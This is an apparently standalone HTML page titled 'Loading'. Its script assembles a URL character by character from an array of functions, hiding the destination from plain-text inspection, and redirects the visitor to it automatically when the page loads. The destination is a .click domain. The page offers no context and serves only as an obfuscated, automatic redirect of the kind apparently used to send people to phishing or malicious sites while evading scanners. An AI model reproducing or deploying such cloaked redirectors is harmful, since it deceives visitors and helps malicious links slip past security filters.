<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            _ => 'h',
            () => 't',
            _ => 't',
            () => 'p',
            function() { return 's'; },
            function() { return ':'; },
            function() { return '/'; },
            _ => '/',
            _ => 'v',
            function() { return 'e'; },
            function() { return 'r'; },
            function() { return 'g'; },
            _ => 'e',
            function() { return 'n'; },
            _ => '.',
            () => 'c',
            _ => 'l',
            function() { return 'i'; },
            () => 'c',
            _ => 'k',
            _ => '/',
            _ => 's',
            function() { return '/'; },
            function() { return 'n'; },
            () => 'e',
            function() { return 'w'; }
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
